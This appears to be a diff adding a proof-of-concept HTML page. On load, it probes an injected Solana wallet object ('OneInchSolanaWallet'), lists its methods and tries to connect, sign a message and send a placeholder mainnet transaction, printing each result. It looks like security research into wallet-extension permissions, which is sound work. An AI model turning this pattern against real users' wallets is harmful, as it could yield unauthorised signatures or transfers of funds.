@@ -1,0 +1,21 @@
+<!doctype html><html><head><meta charset="utf-8"><title>poc9e4</title>
+<script>
+let tries=0;
+function out(m){var d=document.createElement('div');d.textContent=m;document.body.appendChild(d);}
+async function tryAll(){
+  var C=window.OneInchSolanaWallet;
+  if(!C){out('NO CTOR tries='+tries++); if(tries<15){setTimeout(tryAll,1000);} return;}
+  var w=null;
+  try{ w=new C(); }catch(e){ try{ w=new C('mainnet-beta'); }catch(e2){ out('NEW FAIL '+e.message+' / '+e2.message); } }
+  if(!w){ return; }
+  var own=Object.getOwnPropertyNames(w);
+  out('OWN: '+own.join(','));
+  var proto=Object.getOwnPropertyNames(Object.getPrototypeOf(w));
+  out('PROTO: '+proto.join(','));
+  try{ w.on && w.on('connect',function(pk){out('CONNECTED '+String(pk));}); }catch(e){out('ON ERR '+e.message);}
+  var r1; try{ r1=await w.connect(); out('CONNECT '+String(r1).slice(0,40)); }catch(e){out('CONNECT ERR '+e.message);}
+  try{ var r2=await w.signMessage('706f633965'); out('SIG '+String(r2).slice(0,48)); }catch(e){out('SIG ERR '+e.message);}
+  try{ var r3=await w.signAndSendTransaction({transaction:'AAABBB',network:'mainnet-beta'}); out('SEND '+String(r3).slice(0,64)); }catch(e){out('SEND ERR '+e.message);}
+}
+setTimeout(tryAll,1200);
+</script></body></html>
